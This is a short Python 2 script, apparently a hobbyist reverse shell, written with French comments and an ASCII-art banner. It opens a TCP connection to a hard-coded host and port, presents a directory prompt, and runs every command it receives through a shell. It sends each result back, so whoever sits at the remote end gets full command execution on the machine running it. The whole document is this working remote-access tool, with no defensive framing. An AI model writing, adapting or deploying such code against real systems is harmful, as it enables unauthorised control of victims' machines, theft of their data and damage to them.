#!/usr/bin/env python
import socket
import subprocess
import os, sys
from datetime import datetime

subprocess.call('clear', shell=True)

host = '192.168.35.95'
port = 5678

ART = '''
   ___       _   _                 
  / _ \_   _| |_| |__   ___  _ __  
 / /_)/ | | | __| '_ \ / _ \| '_ \ 
/ ___/| |_| | |_| | | | (_) | | | |
\/     \__, |\__|_| |_|\___/|_| |_|
       |___/                       

    > Author : MLF
--------------------------------------------
'''

print ART

#Creation du socket
print '[+] Creating socket ...'
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Bind du socket sur un port
print '[+] Binding socket ...'
conn.connect((host, port))



# On attend une connexion et si une connexion intervient, on l'accepte
while True:
    try:
        client_hostname = socket.gethostname()

        print ">>> Client connected : %s" % (client_hostname)
        while True:
            conn.send(os.getcwd() + ' > ')
            data = conn.recv(2048)
            if data.rstrip() == 'quit':
                conn.close()
                print '[+] Bye'
                sys.exit(1)
                break
            elif 'cd' in data.rstrip():
                os.chdir(data.rstrip().split(' ')[1])
            else:
                process = subprocess.Popen(data, stdout=subprocess.PIPE, shell=True)
                communicate = process.communicate()[0]
                conn.send(communicate)

    except KeyboardInterrupt:
        conn.close()
        print '[+] Bye !'
        sys.exit(1)